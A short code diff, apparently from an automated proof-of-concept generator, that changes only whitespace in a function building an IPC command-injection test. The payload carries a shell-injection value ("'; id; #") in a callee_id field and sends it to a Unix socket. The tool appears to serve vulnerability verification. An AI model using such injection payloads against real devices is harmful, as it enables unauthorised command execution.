@@ -1032,7 +1032,7 @@ def _generate_ipc_injection(ctx: PoCContext) -> str:
                 # POC Payload: Trigger Event 2 (aae_tunnel_test) with command injection in callee_id
                 payload = {{"awsiot": {{"eid": 2, "callee_id": "'; id; #"}} }}
                 payload_str = json.dumps(payload)
-                
+
                 evidence_prefix = (
                     "autopoc_mode=deterministic_nonweaponized "
                     + "candidate_id="
@@ -1045,12 +1045,12 @@ def _generate_ipc_injection(ctx: PoCContext) -> str:
                 try:
                     if not os.path.exists(socket_path):
                          return PoCResult(False, "vulnerability_trigger", evidence_prefix + f" result=socket_not_found path={{socket_path}}", timestamp)
-                    
+
                     client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                     client.connect(socket_path)
                     client.sendall(payload_str.encode())
                     client.close()
-                    
+
                     return PoCResult(True, "vulnerability_trigger", evidence_prefix + f" result=ipc_sent path={{socket_path}} payload={{payload_str}}", timestamp)
                 except Exception as exc:
                     return PoCResult(False, "vulnerability_trigger", evidence_prefix + f" result=error error={{type(exc).__name__}}:{{exc}}", timestamp)
